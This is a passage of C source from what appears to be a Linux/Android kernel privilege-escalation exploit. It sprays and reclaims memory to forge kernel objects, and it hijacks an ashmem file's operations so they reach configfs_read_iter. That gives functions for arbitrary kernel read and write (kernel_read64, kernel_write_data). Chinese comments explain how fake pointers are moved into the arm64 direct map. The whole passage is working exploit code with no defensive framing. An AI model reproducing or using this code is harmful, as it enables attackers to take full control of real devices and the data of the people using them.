  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    SYSCHK(close(pre_ctx.memfds[i]));
    pre_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < post_ctx.mm_cnt - 1; i++) {
    SYSCHK(close(post_ctx.memfds[i]));
    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    SYSCHK(close(spray_ctx.memfds[i]));
    spray_ctx.memfds[i] = -1;
  }

  SYSCHK(close(pcp_shaping_sv[0]));
  SYSCHK(close(pcp_shaping_sv[1]));
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(memfd_leak));
  memfd_leak = -1;
  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
    errno = 0;
    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
    if (sent <= 0) {
      break;
    }
  }
  kernelsnitch_cleanup(ks);
  ks = NULL;

  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
    SYSCHK(close(prepare_ctx.memfds[i]));
    prepare_ctx.memfds[i] = -1;
    kill_child(prepare_ctx.childs[i]);
  }

  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = KERNEL_PAGE_SETUP_ATTEMPTS;
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
    max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  }
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      /* violin fix: 将 mmap 地址转换为 direct map 地址。
       * mmap 地址在用户空间，内核无法直接访问 (TTBR1/TTBR0 分离)。
       * rb_erase 读取 parent->rb_left 时访问用户空间地址 → page fault。
       * direct map 地址在内核地址空间，始终可访问。
       *
       * prepare_skb_payload 已将 fake_lock/fake_w0 等设为 base+offset。
       * 这里加 delta 将它们转为 direct map 地址。
       * page_base 由调用者设置，这里返回 direct map 地址。 */
      uintptr_t direct = userspace_to_direct_map(base);
      if (direct) {
        uintptr_t delta = direct - base;
        fake_lock += delta;
        fake_w0 += delta;
        fake_task += delta;
        fake_fops += delta;
        if (binwrite_target) binwrite_target += delta;
        if (fake_parent) fake_parent += delta;
        if (fake_right) fake_right += delta;
        if (fake_left) fake_left += delta;
        pr_info("direct_map: mmap=0x%lx direct=0x%lx delta=0x%lx\n",
                base, direct, delta);
        return direct;
      }
      pr_warning("pagemap failed, using mmap address (may crash)\n");
      return base;
    }
    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
               max_attempts);
  }
  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
  return 0;
}

ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));
  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, target);
  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, len);
  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t wr = pwrite(fd, data, len, 0);
  return wr;
}

ssize_t configfs_read_once_at_pos(
    int fd, uintptr_t target, void *data, size_t len, off_t pos) {
  unsigned char blob[128];
  memset(blob, 0, sizeof(blob));

  /* This primitive only works after the ashmem file has been routed to
   * configfs_read_iter().  Before the fops hijack, pread() still executes
   * ashmem_read_iter(), which returns EOF while asma->size == 0. */
  uintptr_t page = target - (uintptr_t)pos;
  put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
  put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
  errno = 0;
  int set_ret = try_set_ashmem_name_blob(fd, blob, sizeof(blob));
  int set_errno = errno;
  if (set_ret != 0) {
    errno = set_errno;
    return -1;
  }

  errno = 0;
  ssize_t rd = pread(fd, data, len, pos);
  return rd;
}

ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
  /* In the forged configfs_buffer, count is the fixed ashmem name prefix
   * bytes interpreted as little-endian: "/dev/ashm".  Use pos=count-len
   * so configfs_read_iter() copies exactly len bytes from target:
   *   page = target - pos; copy_from = page + pos = target. */
  off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
  return configfs_read_once_at_pos(fd, target, data, len, pos);
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

uint64_t kernel_read64(int fd, uintptr_t target) {
  uint64_t value = 0;
  ssize_t n = kernel_read_data(fd, target, &value, sizeof(value));
  if (n != (ssize_t)sizeof(value)) {
    return 0;
  }
  return value;
}

ssize_t kernel_write_data(int fd, uintptr_t target, const void *data, size_t len) {
  return configfs_write_once(fd, target, data, len);
}

ssize_t kernel_read_data(int fd, uintptr_t target, void *data, size_t len) {
  return configfs_read_once(fd, target, data, len);
}
